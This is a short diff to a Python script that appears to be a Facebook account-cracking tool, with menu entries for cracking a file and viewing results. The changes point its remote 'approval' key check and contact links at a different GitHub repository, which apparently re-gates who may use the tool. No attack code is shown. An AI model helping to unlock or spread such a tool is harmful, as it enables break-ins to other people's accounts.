@@ -1632,13 +1632,13 @@ def clear():
 def back():
     login()
 def contact():
-    os.system('xdg-open https://github.com/JUBAYER-420/CAYBAR.JUBAYER2.0/blob/main/Apruval.txt')
+    os.system('xdg-open https://github.com/secre159/approval/blob/main/approved.txt.txt')
     back()
 def linex():
     print('\033[1;37m')
 def animation(u):
     for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
-os.system('https://www.facebook.com/groups/396745059590202/permalink/402797872318254/?mibextid=Nif5oz')
+#os.system('https://www.facebook.com/groups/396745059590202/permalink/402797872318254/?mibextid=Nif5oz')
 logo ="""
 \033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
 \033[0;91m┏┓┏┓┓┏┳┓┏┓┳┓  \033[0;94m┏┳┳┳┳┓┏┓┓┏┏┓┳┓┏┓ ┏┓
@@ -1668,7 +1668,7 @@ def meyexudi():
   uuid = str(os.geteuid()) + str(os.getlogin())
   id = "-".join(uuid)
   try:
-    httpCaht = requests.get('https://github.com/JUBAYER-420/CAYBAR.JUBAYER2.0/blob/main/Apruval.txt').text
+    httpCaht = requests.get('https://github.com/secre159/approval/blob/main/approved.txt').text
     if id in httpCaht:
       print(fuckyoursali)
       print(hedaborakarent)
@@ -1807,7 +1807,7 @@ def menu():
     elif JUBAYER in ['1']:
         crack_file()
     elif JUBAYER in ['2','02']:
-        os.system('xdg-open https://github.com/JUBAYER-420/CAYBAR.JUBAYER2.0/blob/main/Apruval.txt')
+        os.system('xdg-open https://github.com/secre159/approval/blob/main/approved.txt')
         os.system("python nono.py")
     elif JUBAYER in ['3','03']:
         result()
